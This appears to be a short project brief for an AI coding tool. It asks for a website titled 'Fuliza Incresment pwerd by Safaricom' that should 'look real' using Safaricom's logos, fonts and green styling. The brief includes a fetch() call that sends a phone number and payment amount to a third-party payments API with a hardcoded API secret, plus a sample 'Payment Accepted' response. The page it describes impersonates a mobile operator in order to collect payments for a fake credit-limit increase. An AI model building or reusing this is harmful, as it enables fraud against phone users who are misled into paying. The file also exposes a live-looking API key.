# DESIGN

Go thoug thet source folder and create an index.html page with those designs in the in the source folder make it sturnning and small in size font the website is caalled Fuliza Incresment pwerd by Safaricom make look real and use the log folders those logos the search for safaricom fontc and use those fonts mostly thin and green layout  


# FUNCTIONALITY

send post request of amount and phone 

fetch('https://api.nestlink.co.ke/runPrompt', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Api-Secret': 'f52159999631ccffe2012a1d'
  },
  body: JSON.stringify({
    phone: '0703615240',
    amount: 100,
  })
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));

{
  "headers": 200,
  "status": true,
  "msg": "Payment Accepted successfully",
  "data": {
    "ResponseCode": "0",
    "ResponseDescription": "The service request has been accepted successfully",
    "MerchantRequestID": "ab04-43cf-b3b2-4c342619e1423191570",
    "CheckoutRequestID": "ws_CO_27102025094143538743981331",
    "ResultCode": "0",
    "ResultDesc": "The service request is processed successfully."
  }
}